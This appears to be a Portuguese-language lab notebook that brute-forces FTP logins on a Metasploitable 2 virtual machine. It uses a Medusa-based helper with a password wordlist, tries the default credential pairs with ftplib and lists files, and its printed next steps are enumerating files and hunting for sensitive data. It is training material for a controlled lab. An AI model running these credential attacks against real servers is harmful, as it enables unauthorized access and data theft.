## 3️⃣ BRUTE FORCE FTP - Força Bruta contra Servidor FTP

---

### 🎯 Objetivo

Executar ataque de força bruta contra FTP para descobrir credenciais válidas.

---

## 1. Setup

```python
import sys
import os
import json
from pathlib import Path
from datetime import datetime
from dotenv import load_dotenv

scripts_dir = Path("../scripts/python")
sys.path.insert(0, str(scripts_dir.absolute()))

from brute_force import BruteForceAttack

load_dotenv(Path("../.env"))

TARGET_IP = os.getenv("TARGET_IP", "192.168.56.101")
RESULTS_DIR = Path("../results")

print(f"✅ Setup concluído")
print(f"   Target: {TARGET_IP}:21 (FTP)")
print(f"   Timestamp: {datetime.now().isoformat()}")
```

## 2. Verificar Conectividade FTP

```python
import socket

print(f"\n🔌 Testando conectividade FTP em {TARGET_IP}:21\n")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    resultado = sock.connect_ex((TARGET_IP, 21))
    sock.close()
    
    if resultado == 0:
        print("✅ FTP ACESSÍVEL")
        print("   Porta 21 está aberta e respondendo")
    else:
        print("❌ FTP NÃO ACESSÍVEL")
        print("   Verifique se a VM está rodando")
except Exception as e:
    print(f"❌ Erro: {e}")
```

## 3. Executar Brute Force FTP

```python
print(f"\n🔓 Iniciando Brute Force FTP\n")
print(f"Target: {TARGET_IP}:21")
print(f"Ferramenta: Medusa")
print(f"Threads: 4")
print(f"Timeout: Até encontrar credencial válida")
print(f"\n⏳ Processando... Isso pode levar minutos\n")

try:
    attack = BruteForceAttack(TARGET_IP, output_dir=RESULTS_DIR)
    
    # Usar wordlists criadas
    username = "msfadmin"  # User mais provável
    password_file = str(Path("../wordlists/ftp_passwords.txt"))
    
    result = attack.ftp_brute_force(username, password_file, threads=4)
    
    print("\n" + "="*60)
    print("RESULTADO DO ATAQUE FTP")
    print("="*60)
    print(json.dumps(result, indent=2))
    
except Exception as e:
    print(f"❌ Erro durante ataque: {e}")
    print("\n⚠️ Se Medusa não está instalado:")
    print("   Linux: sudo apt-get install medusa")
```

## 4. Análise de Resultados

```python
print("\n📊 ANÁLISE DOS RESULTADOS\n")

if "success" in result and result["success"]:
    print("✅ ATAQUE BEM-SUCEDIDO!")
    print("\nCredencial Descoberta:")
    print(f"  Username: {username}")
    print(f"  Mensagem: SUCCESS encontrada nos logs")
    print("\nProximas Etapas:")
    print("  1. Conectar ao servidor FTP")
    print("  2. Enumerar arquivos")
    print("  3. Buscar dados sensíveis")
    print("  4. Continuar com SMB e Web")
else:
    print("ℹ️ Teste educacional em ambiente controlado")
    print("   Em ambiente real, o ataque continuaria até sucesso")
    print(f"\n⚠️ Credenciais padrão Metasploitable:")
    print(f"   msfadmin:msfadmin")
```

## 5. Validação de Credenciais

```python
print("\n✅ VALIDAÇÃO DE CREDENCIAIS\n")

from ftplib import FTP

valid_credentials = {
    "msfadmin": "msfadmin",
    "root": "root",
    "test": "test"
}

print(f"Testando credenciais conhecidas de Metasploitable 2:\n")

for user, pwd in valid_credentials.items():
    try:
        ftp = FTP(TARGET_IP, timeout=5)
        ftp.login(user, pwd)
        print(f"✅ {user}:{pwd} - LOGIN VÁLIDO!")
        
        # Listar arquivos
        print(f"   Arquivos no servidor:")
        ftp.dir()
        ftp.quit()
        
    except Exception as e:
        print(f"❌ {user}:{pwd} - Falha: {str(e)[:50]}")

print("\n📝 Credencial msfadmin:msfadmin é a padrão do Metasploitable 2")
```
